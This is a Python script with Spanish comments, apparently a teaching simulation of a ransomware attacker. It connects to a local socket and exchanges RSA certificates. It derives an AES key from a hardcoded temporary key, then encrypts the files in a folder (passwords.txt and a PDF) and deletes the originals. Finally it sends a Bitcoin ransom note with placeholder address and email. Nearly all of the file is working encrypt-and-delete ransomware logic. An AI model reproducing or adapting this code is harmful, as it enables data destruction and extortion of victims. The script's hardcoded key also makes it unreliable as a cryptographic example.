import socket 
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import json
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

def ensure_directory_exists(directory):
    """Crea la carpeta si no existe, para almacenar los archivos cifrados."""
    if not os.path.exists(directory):
        os.makedirs(directory)


def calculate_file_hashes(files):
    """Calcula los hashes SHA-256 de los archivos y los guarda en un archivo JSON."""
    hashes = {}
    for file in files:
        with open(f'Files_to_encrypt/{file}', 'rb') as f:
            file_data = f.read()
            file_hash = SHA256.new(file_data).hexdigest()
            hashes[file] = file_hash

    # Guardar los hashes en un archivo JSON
    with open('file_hashes.json', 'w') as hash_file:
        json.dump(hashes, hash_file)

    print("Hashes de los archivos originales guardados en 'file_hashes.json'.")

def encrypt_files(secret_key, files):
    """Cifra los archivos usando AES en modo CBC y los guarda con un sufijo '.enc'."""
    ensure_directory_exists('Files_encrypted')  # Asegura que la carpeta de archivos cifrados exista

    for file in files:
        # Crear un nuevo objeto de cifrado con un IV aleatorio (para cada archivo)
        cipher = AES.new(secret_key, AES.MODE_CBC)
        iv = cipher.iv  # Obtener el IV generado por el cifrador

        # Leer el contenido del archivo original
        with open(f'Files_to_encrypt/{file}', 'rb') as f:
            plaintext = f.read()

        # Cifrar el archivo con AES en modo CBC
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

        # Guardar el archivo cifrado con el IV incluido al inicio
        with open(f'Files_encrypted/{file}.enc', 'wb') as f:
            f.write(iv + ciphertext)

        # Eliminar el archivo original después de cifrarlo
        os.remove(f'Files_to_encrypt/{file}')

    # Verificar si la carpeta de archivos a cifrar está vacía, y eliminarla si es necesario
    if not os.listdir('Files_to_encrypt'):
        os.rmdir('Files_to_encrypt')  # Eliminar la carpeta si está vacía
        print("La carpeta 'Files_to_encrypt' estaba vacía y ha sido eliminada.")

    print("Archivos cifrados y originales eliminados.")

def send_decryption_instructions(attacker_socket, short_term_key):
    """Envía las instrucciones de descifrado al atacante, incluyendo la clave temporal cifrada."""
    decryption_instructions = {
        "instructions": "Use la siguiente clave temporal para derivar la clave simétrica y descifrar los archivos.",
        "short_term_key": short_term_key.decode()
    }
    # Enviar las instrucciones al atacante a través del socket
    attacker_socket.send(json.dumps(decryption_instructions).encode())
    print("Instrucciones de descifrado enviadas.")

def attacker_program():
    """Simula el comportamiento de un atacante que cifra los archivos de la víctima."""
    host = '127.0.0.1'
    port = 5000

    # Generar el par de claves RSA del atacante
    attacker_key = RSA.generate(2048)
    attacker_public_key = attacker_key.publickey().export_key().decode()
    attacker_cert = {'id': 'Atacante', 'pk': attacker_public_key}

    # Conexión al servidor (máquina víctima)
    attacker_socket = socket.socket()
    attacker_socket.connect((host, port))

    # Enviar el certificado del atacante al servidor
    attacker_socket.send(json.dumps(attacker_cert).encode())

    # Recibir y mostrar el certificado de la víctima
    victim_cert = json.loads(attacker_socket.recv(2048).decode())
    print("Certificado recibido de la víctima:", victim_cert)

    # Importar la clave pública de la víctima desde su certificado
    victim_public_key = RSA.import_key(victim_cert['pk'].encode())

    # Generar una clave temporal para cifrar y luego cifrarla con la clave pública de la víctima
    short_term_key = b"clave-temporal"
    cipher = PKCS1_OAEP.new(victim_public_key)
    encrypted_key = cipher.encrypt(short_term_key)

    # Enviar la clave cifrada al servidor (víctima)
    attacker_socket.send(encrypted_key)

    # Derivar una clave simétrica utilizando la clave temporal (en este caso SHA256)
    kdf = SHA256.new()
    kdf.update(short_term_key)
    symmetric_key = kdf.digest()[:16]  # Obtener solo los primeros 16 bytes
    
    
        
    # Lista de archivos a cifrar en la víctima
    files_to_encrypt = ['passwords.txt', 'criptografia_post_cuantica_BERMUDEZ_BLANCO_ALBERTO_JESUS.pdf']
    
    # Calcular los hashes de los archivos
    calculate_file_hashes(files_to_encrypt)
    
    # Cifrar los archivos con la clave simétrica
    encrypt_files(symmetric_key, files_to_encrypt)  # Cifrar los archivos

    # Enviar un mensaje de rescate con las instrucciones de pago
    ransom_message ="Sus archivos han sido cifrados. Para recuperarlos, envíe 0.1 BTC a la siguiente dirección: 1BitcoinAddress... Una vez realizado el pago, contacte al correo attacker@example.com con la confirmación."
    
    attacker_socket.send(json.dumps(ransom_message).encode())

    print("Archivos cifrados y notificación enviada.")
    
    # Simulación de pago recibido por parte de la víctima
    input("Presione Enter después de que se haya recibido el pago...")

    # Enviar las instrucciones de descifrado al atacante
    send_decryption_instructions(attacker_socket, short_term_key)

    # Cerrar el socket después de completar el proceso
    attacker_socket.close()


if __name__ == '__main__':
    attacker_program()
